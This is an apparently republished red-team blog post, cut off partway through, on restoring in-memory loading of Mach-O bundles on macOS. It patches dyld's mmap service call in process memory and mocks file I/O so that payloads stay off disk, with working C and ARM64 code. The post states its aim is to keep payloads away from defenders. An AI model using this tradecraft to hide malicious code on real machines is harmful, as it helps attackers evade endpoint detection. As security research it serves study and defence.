---
title: Restoring Dyld Memory Loading
url: https://buaq.net/go-145537.html
source: unSafe.sh - 不安全
date: 2023-01-15
fetch_date: 2025-10-04T03:55:51.583496
---

# Restoring Dyld Memory Loading

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/9818cc490d2b631d664282e8da5f5600.jpg)

Restoring Dyld Memory Loading

read file error: read notes: is a directory
*2023-1-14 20:3:31
Author: [blog.xpnsec.com(查看原文)](/jump-145537.htm)
阅读量:37
收藏*

---

[« Back to home](https://blog.xpnsec.com "Back to homepage")

Up until recently, we’ve enjoyed in-memory loading of Mach-O bundles courtesy of dyld and its `NSCreateObjectFileImageFromMemory` / `NSLinkModule` API methods. And while these methods still exist today, there is a key difference.. modules are now persisted to disk.

Reported by [@roguesys](https://hackd.net/posts/macos-reflective-code-loading-analysis/) in Feb 2022, dyld’s code was updated to take any modules being passed to `NSLinkModule` and write them to a temporary location.

As a red-teamer, this is less than optimal for us during engagements. After all, the reason that `NSLinkModule` was so useful was to keep payloads out of the (easy) reach of the blue-team.

So in this post we’ll take a look at just what was changed in dyld, and see what we can do to restore this functionality… hopefully keeping our warez in memory for a little longer.

## What Makes NSLinkModule Tick?

As dyld is open source, let’s dig into the often used `NSLinkModule` method to see if we can understand just how it works.

The function has the signature of:

```
NSModule APIs::NSLinkModule(NSObjectFileImage ofi, const char* moduleName, uint32_t options) { ... }
```

The first argument is `ofi`, which is created using `NSCreateObjectFileImageFromMemory` and it basically just points to memory hosting a Mach-O bundle alongside its length.

Then we have both the `moduleName` param, which is just used for logging statements, and the `options` param, which is ignored.

The new changes to `NSLinkModule` now write the memory pointed to by `ofi` to disk:

```
if ( ofi->memSource != nullptr ) {
	...
	char        tempFileName[PATH_MAX];
	const char* tmpDir = this->libSystemHelpers->getenv("TMPDIR");
	if ( (tmpDir != nullptr) && (strlen(tmpDir) > 2) ) {
		strlcpy(tempFileName, tmpDir, PATH_MAX);
		if ( tmpDir[strlen(tmpDir) - 1] != '/' )
			strlcat(tempFileName, "/", PATH_MAX);
	}
	else
		strlcpy(tempFileName, "/tmp/", PATH_MAX);
	strlcat(tempFileName, "NSCreateObjectFileImageFromMemory-XXXXXXXX", PATH_MAX);
	int fd = this->libSystemHelpers->mkstemp(tempFileName);
	if ( fd != -1 ) {
		ssize_t writtenSize = ::pwrite(fd, ofi->memSource, ofi->memLength, 0);
	}
	...
}
```

Well.. they aren’t really “new” code changes. This code has always been present in dyld3, but now macOS has decided to adopt this code path as well, leaving us with the current situation.

So we know memory is written to disk, but what happens with the file? Well the path is just passed to `dlopen_from`:

```
...
ofi->handle = dlopen_from(ofi->path, openMode, callerAddress);
...
```

So essentially this now makes `NSLinkModule` a wrapper around `dlopen`.. boo!!

The next question for us is… can we can restore dyld’s previous memory loading magic?

If we boil it down to its core components.. we know that dyld lives in our process address space. And we know that disk I/O calls are being used to persist and read our code… so what happens if we just intercept the calls before they ever give the game away?

## Dyld Hooking

For us to intercept I/O calls, we first need to understand how we can hook dyld.

Let’s look at how `mmap` calls are handled within dyld. Firing up Hopper and loading in `/usr/lib/dyld` shows us that `mmap` is invoked by dyld using a `svc` call:

![](https://assets.xpnsec.com/dyld-memory-loading/image1.png)

Knowing this, if we find the location in memory hosting this code, we should be able to overwrite the service call and redirect its execution to something we control. But what do we overwrite it with? How about something simple like:

```
ldr x8, _value
br x8
_value: .ascii "\x41\x42\x43\x44\x45\x46\x47\x48" ; Update to our br location
```

Before we get too ahead of ourselves, let’s first find the base of dyld in our process address space. This is done using the `task_info` call, passing in `TASK_DYLD_INFO` to retrieve (among other things) information on the base address of dyld.

```
void *getDyldBase(void) {
    struct task_dyld_info dyld_info;
    mach_vm_address_t image_infos;
    struct dyld_all_image_infos *infos;

    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    kern_return_t ret;

    ret = task_info(mach_task_self_,
                    TASK_DYLD_INFO,
                    (task_info_t)&dyld_info,
                    &count);

    if (ret != KERN_SUCCESS) {
        return NULL;
    }

    image_infos = dyld_info.all_image_info_addr;

    infos = (struct dyld_all_image_infos *)image_infos;
    return infos->dyldImageLoadAddress;
}
```

Once we have dyld’s base, we’ll can search for a signature for the `mmap` service call:

```
bool searchAndPatch(char *base, char *signature, int length, void *target) {

    char *patchAddr = NULL;
    kern_return_t kret;

    for(int i=0; i < 0x100000; i++) {
        if (base[i] == signature[0] && memcmp(base+i, signature, length) == 0) {
            patchAddr = base + i;
            break;
        }
    }
    ...
```

When we find a match to the signature, we can patch in our ARM64 stub. As we’re dealing with a `Read-Exec` page of memory, we’ll need to update the memory protection with:

```
kret = vm_protect(mach_task_self(), (vm_address_t)patchAddr, sizeof(patch), false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
if (kret != KERN_SUCCESS) {
    return FALSE;
}
```

Note the `VM_PROT_COPY` here, which is required here as the page of memory hosting the segment has no write permission set in its maximum memory protection.

With write permission set, we overwrite memory with our patch, and then return the protection to `Read-Exec`:

```
// Copy our path
memcpy(patchAddr, patch, sizeof(patch));

// Set the br address for our hook call
*(void **)((char*)patchAddr + 16) = target;

// Return exec permission
kret = vm_protect(mach_task_self(), (vm_address_t)patchAddr, sizeof(patch), false, PROT_READ | PROT_EXEC);
if (kret != KERN_SUCCESS) {
	return FALSE;
}
```

Just before we move on we need to consider what happens on M1 macs when we attempt to modify executable pages of memory.

Due to macOS ensuring that each page of executable memory is signed, we will need to have an entitlement if our code is executing in a hardened runtime. This means we will need an entitlement of `com.apple.security.cs.allow-unsigned-executable-memory` (`com.apple.security.cs.disable-executable-page-protection` works also):

![](https://assets.xpnsec.com/dyld-memory-loading/image2.png)

So with that out of the way.. what do we do with our hooks?

## Mocking

With all the components mapped out, we can now start mocking out API calls. Reviewing dyld’s code, we’ll need to create mocks for:

* `mmap`
* `pread`
* `fcntl`

If we get this right, we can make the `NSLinkModule` call with memory pointing to a blank Mach-O file, which in turn will be written to disk. And then when dyld thinks it is reading in the file from disk, we swap the content dynamically with a copy stored in memory :)

First up is `mmap`. The plan is to first check that `fd` points to a filename containing `NSCreateObjectFileImageFromMemory-`, which will be the temporary file which dyld wrote to disk.

If this is the case, instead of mapping in memory from disk, we’ll simply allocate a new region of memory and copy over our nefarious Mach-O bundle:

```
#define FILENAME_SEARCH "NSCreateObjectFileImageFromMemory-"

const void* hookedMmap(void *addr, size_t len, int prot, int flags, i...